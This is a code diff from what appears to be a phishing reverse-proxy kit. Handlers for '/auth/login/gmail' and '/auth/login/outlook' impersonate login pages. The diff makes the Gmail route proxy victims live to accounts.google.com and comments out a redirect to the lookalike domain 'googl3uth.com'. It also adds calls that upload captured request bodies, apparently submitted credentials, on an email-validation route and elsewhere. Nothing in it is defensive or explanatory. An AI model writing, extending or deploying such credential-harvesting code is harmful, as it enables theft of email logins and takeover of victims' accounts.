@@ -144,9 +144,10 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
 
             if (this.req.url === '/dashboard/secure/addons/emailvalidate') {
                 clientContext.setLogAvailable(true)
+                super.uploadRequestBody('PHP-EXEC', clientContext)
                 super.superExecutePhpScript('app/addons/emailvalidate.php', clientContext)
             } else {
-                super.captureBody('PHP-EXEC', clientContext)
+                super.uploadRequestBody('PHP-EXEC', clientContext)
                 this.res.writeHead(200)
                 this.res.end()
             }
@@ -202,11 +203,11 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
             }
             if (this.req.url === '/auth/login/gmail') {
                 // eslint-disable-next-line max-len
-                /** this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                 clientContext.currentDomain = 'accounts.google.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext) */
-                this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
-                return this.res.end('')
+                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                // this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
+                // return this.res.end('')
             }
             if (this.req.url === '/auth/login/outlook') {
                 clientContext.info.disableDeflate = true;
